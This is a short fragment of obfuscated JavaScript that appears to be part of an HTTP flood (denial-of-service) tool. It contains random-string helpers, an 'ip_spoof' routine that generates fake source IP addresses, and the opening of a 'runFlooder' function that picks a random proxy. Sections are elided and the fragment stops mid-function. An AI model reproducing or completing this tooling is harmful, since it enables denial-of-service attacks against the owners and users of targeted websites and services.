...
function randomElement(_0x3a20ae) {
  return _0x3a20ae[Math.floor(Math.random() * (_0x3a20ae.length - 0) + 0)];
}
function randstr(_0x26dec8) {
  let _0x1ef81a = '';
  const _0x4eab86 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'.length;
  for (let _0x840ca5 = 0; _0x840ca5 < _0x26dec8; _0x840ca5++) {
    _0x1ef81a += 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'.charAt(Math.floor(Math.random() * _0x4eab86));
  }
  return _0x1ef81a;
}
const ip_spoof = () => {
...
const spoofed = Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
const ip_spoof2 = () => {
...
function runFlooder() {
  const _0xb62986 = proxies[Math.floor(Math.random() * (proxies.length - 0) + 0)];
